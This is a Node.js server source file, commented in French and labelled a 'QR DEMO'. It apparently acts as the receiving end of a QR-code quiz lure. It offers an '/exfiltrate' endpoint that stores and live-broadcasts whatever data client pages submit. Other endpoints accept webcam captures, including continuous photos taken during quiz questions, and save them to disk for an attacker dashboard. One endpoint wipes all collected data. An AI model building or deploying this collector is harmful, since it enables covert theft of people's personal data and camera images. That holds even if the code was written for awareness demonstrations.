const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const ip = require('ip');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const dir = './uploads';
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    cb(null, dir);
  },
  filename: (req, file, cb) => cb(null, `photo_${Date.now()}.jpg`)
});
const upload = multer({ storage });

let collectedData = [];

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));
app.use('/uploads', express.static('uploads'));

app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Endpoint exfiltration
app.post('/exfiltrate', (req, res) => {
  const data = req.body;
  data.timestamp = new Date().toISOString();
  data.serverIP = ip.address();
  collectedData.push(data);
  io.emit('new-data', data);
  fs.appendFileSync('collected.json', JSON.stringify(data, null, 2) + ',\n');
  console.log('[EXFIL]', JSON.stringify(data, null, 2));
  res.json({ status: 'ok' });
});

// Endpoint photo (base64 direct depuis le quiz)
app.post('/upload-photo', (req, res) => {
  const data = req.body;
  if (data && data.photo) {
    const photoData = {
      type: data.type || 'photo',
      photo: data.photo,
      question: data.question || '?',
      photoNumber: data.photoNumber || 0,
      totalCaptures: data.totalCaptures || 0,
      timestamp: data.timestamp || new Date().toISOString()
    };
    collectedData.push(photoData);
    io.emit('new-data', photoData);

    // Sauvegarder sur disque si photo continue
    if (data.type === 'photo_continuous') {
      const base64Data = data.photo.replace(/^data:image\/jpeg;base64,/, '');
      const filename = `capture_q${data.question}_${data.photoNumber}_${Date.now()}.jpg`;
      fs.writeFileSync(`./uploads/${filename}`, base64Data, 'base64');
      console.log(`[CAPTURE] ${filename}`);
    }
    res.json({ status: 'ok' });
  } else {
    res.status(400).json({ status: 'error', message: 'No photo data' });
  }
});

// Endpoint upload multer (depuis index.html)
app.post('/upload-photo-file', upload.single('photo'), (req, res) => {
  if (req.file) {
    const photoData = {
      type: 'photo',
      photo: `/uploads/${req.file.filename}`,
      timestamp: new Date().toISOString()
    };
    collectedData.push(photoData);
    io.emit('new-data', photoData);
    console.log('[PHOTO]', req.file.filename);
    res.json({ status: 'ok', file: req.file.filename });
  } else {
    res.status(400).json({ status: 'error' });
  }
});

// Récupérer toutes les données
app.get('/api/data', (req, res) => res.json(collectedData));

// NETTOYAGE COMPLET
app.delete('/api/data', (req, res) => {
  collectedData = [];
  try {
    fs.writeFileSync('collected.json', '[]');
    const uploadsDir = './uploads';
    if (fs.existsSync(uploadsDir)) {
      const files = fs.readdirSync(uploadsDir);
      for (const file of files) {
        const filePath = path.join(uploadsDir, file);
        if (fs.lstatSync(filePath).isFile()) fs.unlinkSync(filePath);
      }
    }
    console.log('[NETTOYAGE] Terminé');
    res.json({ status: 'cleared', message: 'Données supprimées', timestamp: new Date().toISOString() });
  } catch (err) {
    res.status(500).json({ status: 'error', message: err.message });
  }
});

// Stats du serveur
app.get('/api/stats', (req, res) => {
  let photoCount = 0, uploadSize = 0;
  try {
    if (fs.existsSync('./uploads')) {
      const files = fs.readdirSync('./uploads');
      photoCount = files.length;
      for (const file of files) {
        const fp = path.join('./uploads', file);
        if (fs.lstatSync(fp).isFile()) uploadSize += fs.statSync(fp).size;
      }
    }
  } catch (e) { }
  res.json({ totalEntries: collectedData.length, photosOnDisk: photoCount, uploadSizeMB: (uploadSize / (1024 * 1024)).toFixed(2) });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`\n🔴 QR DEMO: http://localhost:${PORT}\n📊 DASHBOARD: http://localhost:${PORT}/dashboard\n📡 IP: http://${ip.address()}:${PORT}\n`);
});